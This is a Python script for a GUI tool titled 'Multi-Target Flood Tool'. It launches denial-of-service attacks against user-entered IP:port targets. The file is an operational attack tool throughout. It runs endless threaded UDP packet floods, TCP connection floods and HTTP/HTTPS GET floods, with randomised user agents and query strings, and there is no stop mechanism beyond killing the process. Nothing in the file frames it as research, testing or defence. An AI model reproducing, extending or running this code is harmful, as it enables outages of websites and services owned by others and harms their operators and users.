import socket
import random
import threading
import time
import ssl
import tkinter as tk
from tkinter import ttk, messagebox
from colorama import init

init(autoreset=True)

def udp_flood(target_ip, target_port, packet_size):
    while True:
        try:
            udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udp_socket.sendto(random.randbytes(packet_size), (target_ip, target_port))
        except Exception:
            pass
        finally:
            udp_socket.close()

def tcp_flood(target_ip, target_port):
    while True:
        try:
            tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcp_socket.settimeout(3)
            tcp_socket.connect((target_ip, target_port))
            tcp_socket.send(b"GET / HTTP/1.1\r\nHost: %b\r\n\r\n" % target_ip.encode())
            tcp_socket.close()
        except Exception:
            pass

def http_flood(target_ip, target_port, use_https=False):
    while True:
        try:
            sock = socket.create_connection((target_ip, target_port))
            if use_https:
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=target_ip)

            user_agent = random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "AppleWebKit/537.36 (KHTML, like Gecko)",
                "Chrome/91.0.4472.124 Safari/537.36"
            ])
            request = f"GET /?{random.randint(1,9999)} HTTP/1.1\r\n"
            request += f"Host: {target_ip}\r\n"
            request += f"User-Agent: {user_agent}\r\n\r\n"
            sock.send(request.encode())
            sock.close()
        except Exception:
            pass

def start_attack(targets, attack_type):
    threads = []
    for target in targets:
        ip, port = target
        if attack_type == "UDP":
            for _ in range(10):
                t = threading.Thread(target=udp_flood, args=(ip, port, 1024), daemon=True)
                t.start()
                threads.append(t)
        elif attack_type == "TCP":
            for _ in range(10):
                t = threading.Thread(target=tcp_flood, args=(ip, port), daemon=True)
                t.start()
                threads.append(t)
        elif attack_type in ("HTTP", "HTTPS"):
            for _ in range(10):
                t = threading.Thread(target=http_flood, args=(ip, port, attack_type == "HTTPS"), daemon=True)
                t.start()
                threads.append(t)

def parse_targets(raw_text, default_port):
    targets = []
    lines = raw_text.strip().split('\n')
    for line in lines:
        if not line.strip():
            continue
        try:
            if ':' in line:
                ip, port = line.strip().split(':')
                port = int(port)
            else:
                ip = line.strip()
                port = default_port
            socket.gethostbyname(ip)  # Validates IP or hostname
            targets.append((ip, port))
        except Exception as e:
            messagebox.showerror("Error", f"Invalid target: {line.strip()}\n{str(e)}")
            return None
    return targets

def on_start():
    attack_type = attack_type_var.get()
    default_ports = {"UDP": 53, "TCP": 80, "HTTP": 80, "HTTPS": 443}
    raw_targets = targets_text.get("1.0", tk.END)
    targets = parse_targets(raw_targets, default_ports.get(attack_type, 80))
    if not targets:
        return
    status_label.config(text="Attack in progress...")
    start_attack(targets, attack_type)

def on_stop():
    messagebox.showinfo("Stop", "To stop threads, please terminate the script manually.")

root = tk.Tk()
root.title("Multi-Target Flood Tool")

frame = ttk.Frame(root, padding=10)
frame.pack(fill="both", expand=True)

attack_type_var = tk.StringVar(value="HTTP")
ttk.Label(frame, text="Attack Type:").pack(anchor="w")
ttk.OptionMenu(frame, attack_type_var, "HTTP", "UDP", "TCP", "HTTP", "HTTPS").pack(fill="x")

ttk.Label(frame, text="Targets (IP:Port per line):").pack(anchor="w")
targets_text = tk.Text(frame, height=10)
targets_text.pack(fill="both", expand=True)

start_button = ttk.Button(frame, text="Start Attack", command=on_start)
start_button.pack(pady=5)

stop_button = ttk.Button(frame, text="Stop Attack", command=on_stop)
stop_button.pack(pady=5)

status_label = ttk.Label(frame, text="Idle")
status_label.pack()

root.mainloop()
